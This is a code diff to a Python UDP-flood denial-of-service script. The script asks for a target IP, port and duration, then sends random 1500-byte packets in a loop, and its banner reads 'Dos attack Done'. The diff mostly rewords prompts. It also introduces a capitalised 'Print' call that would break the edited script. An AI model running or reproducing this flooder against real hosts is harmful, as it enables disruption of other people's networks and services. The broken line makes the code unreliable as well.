@@ -19,10 +19,10 @@ print(
 )
 sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 bytes = random._urandom(1500)
-print("")
-ip = input(f"{Fore.CYAN}[+] Enter target ip : ")
-port = int(input("[+] Enter target port (defult 80) : "))
-dur = int(input("[+] Enter time duration (1~100000) : "))
+Print("")
+ip = input(f"{Fore.CYAN} - Enter Target IP : ")
+port = int(input("       - Enter Target Port (Defult 80) : "))
+dur = int(input("        - Enter Time Duration (1~100000) : "))
 timeout = time.time() + dur
 sent = 0
 while True :
@@ -37,5 +37,5 @@ while True :
     except KeyboardInterrupt:
         sys.exit()
 print(f"""{Fore.RED}
-    Dos attack Done:)
+    Done Send !
 """)
